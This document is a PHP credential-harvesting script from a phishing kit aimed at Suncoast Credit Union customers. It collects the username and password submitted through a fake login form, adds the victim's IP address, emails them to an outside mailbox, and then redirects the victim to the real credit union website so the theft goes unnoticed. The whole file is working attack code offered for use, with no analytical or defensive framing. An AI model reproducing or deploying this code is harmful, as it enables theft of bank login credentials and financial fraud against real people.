<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Suncoast ReZulT-----------------------\n";
$message .= "Username : ".$_POST['user']."\n";
$message .= "password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By Mr.H4-----------------------------\n";

$recipient = "sharpsharp1905@yandex.com";
$subject = "Suncoast ReZulT- $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.suncoastcreditunion.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>